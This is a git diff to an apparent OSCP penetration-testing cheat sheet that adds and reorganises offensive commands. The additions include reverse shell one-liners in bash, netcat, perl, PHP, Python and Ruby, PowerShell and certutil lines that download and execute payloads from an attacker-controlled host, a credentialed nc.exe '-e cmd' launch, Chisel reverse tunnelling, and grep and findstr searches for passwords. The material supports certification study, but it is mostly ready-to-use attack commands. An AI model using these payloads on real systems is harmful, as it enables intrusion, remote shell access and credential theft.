@@ -95,22 +95,33 @@ Commands, Payloads and Resources for the Offensive Security Certified Profession
 ## Commands
 
 ### Basics
-#### Basic Enumeration / Linux
-id
-sudo -l
-#### Basic Enumeration / Windows
+#### CentOS
 ```c
-systeminfo
-whoami /all
-net users
-net users <user>
+doas -u <user> /bin/sh
 ```
-#### grep for Passwords
-#### vi
+#### Certutil
 ```c
-:w !sudo tee %    # save file with evelated privileges without exiting
+certutil -urlcache -split -f "http://<local_ip>/<file>" <file>
 ```
-
+#### Chisel
+```c
+$ ./chisel server -p 9002 -reverse -v
+$ ./chisel client <remote_ip>:9002 R:9003:127.0.0.1:8888
+```
+#### Netcat
+```c
+nc -lnvp <local_port> < <file>
+nc <remote_ip> <remote_port> > <file>
+```
+#### PHP Webserver
+```c
+sudo php -S 127.0.0.1:80
+```
+#### Python Webserver
+```c
+sudo python -m SimpleHTTPServer 80
+sudo pyhton3 -m http.server 80
+```
 #### tmux
 ```c
 ctrl b + w    # navigate
@@ -128,6 +139,15 @@ ctrl b + [    # enter copy
 ctrl + s      # enter search from copy mode
 ctrl + r      # reverse search
 ```
+#### Upgrading Shells
+```c
+python -c 'import pty;pty.spawn("/bin/bash")'
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+```
+#### vi
+```c
+:w !sudo tee %    # save file with evelated privileges without exiting
+```
 
 ### Information Gathering
 #### DNS
@@ -141,7 +161,7 @@ dig {a|txt|ns|mx} <domain>
 dig {a|txt|ns|mx} <domain> @ns1.<domain>
 dig axfr @<remote_ip> <domain>           # zone transfer - needs tcp DNS - port 53
 ```
-#### SMB / Netbios
+#### SMB / NetBIOS
 ```c
 nbtscan <remote_ip>
 enum4linux -a <remote_ip>
@@ -168,9 +188,6 @@ locate -r '\.nse$' | xargs grep categories | grep categories | grep 'default\|ve
 ```c
 
 ```
-
-
-
 ### Exploitation Tools
 #### Web Shells
 ```c
@@ -183,7 +200,29 @@ locate -r '\.nse$' | xargs grep categories | grep categories | grep 'default\|ve
 ```c
 powershell -c "$SecPass = Convertto-securestring 'Welcome1!' -AsPlainText -Force;$cred=New-Object System.Management.Automation.PScredential('administrator', $SecPass);Start-Process -FilePath 'C:\Users\Public\Downloads\nc.exe' -argumentlist '-e cmd <local_ip> <local_port>' -Credential $cred"
 ```
+#### Basic Enumeration / Linux
 ```c
+id
+sudo -l
+uname -a
+cat /etc/hosts
+cat /etc/fstab
+cat /etc/passwd
+ss -tulpn
+ps -auxf
+ls -lahv
+ls -R /home
+```
+#### Basic Enumeration / Windows
+```c
+systeminfo
+whoami /all
+net users
+net users <user>
+```
+#### grep for Passwords
+```c
+grep -R db_passwd
 grep -roiE "password.{20}"
 grep -oiE "password.{20}" /etc/*.conf
 ```
@@ -207,11 +246,46 @@ powershell -c "Invoke-Webrequest -Uri \"http://<local_ip>:<local_port>/shell.exe
 
 echo "IEX (New-object System.net.webclient).DownloadString('http://<local_ip>:<local_port>/shell.ps1')" | powershell -noprofile -
 ```
+#### Windows Tasks & Services
+```c
+tasklist /SVC
+netsh firewall show state
+schtasks /query /fo LIST /v
+driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object 'Display Name', 'Start Mode', Path
+```
+```c
+sc query
+sc qc <service-name>
+accesschk.exe -uws "Everyone" "C:\Program Files"
 
+dir /s *pass* == *cred* == *vnc* == *.config*
+findstr /si password *.xml *.ini *.txt
 
+wmic qfe get Caption,Description,HotFixID,InstalledOn    # no new patches - KEXP pretty likely
+```
+#### Writeable Directories in Linux
+```c
+/dev/shm
+/tmp
+```
+#### Reverse Shells
+```c
+bash -i >& /dev/tcp/<local_ip>/<local_port> 0>&1
+bash -c 'bash -i >& /dev/tcp/<local_ip>/<local_port> 0>&1'
 
+nc -e /bin/sh <local_ip> <local_port>
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <local_ip> <local_port> >/tmp/f
 
+perl -e 'use Socket;$i="<local_ip>";$p=<local_port>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 
+php -r '$sock=fsockopen("<local_ip>",<local_port>);exec("/bin/sh -i <&3 >&3 2>&3");'
+
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<local_ip>",<local_port>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<local_ip>",<local_port>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+ruby -rsocket -e'f=TCPSocket.open("<local_ip>",<local_port>).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
+```
 
 
 
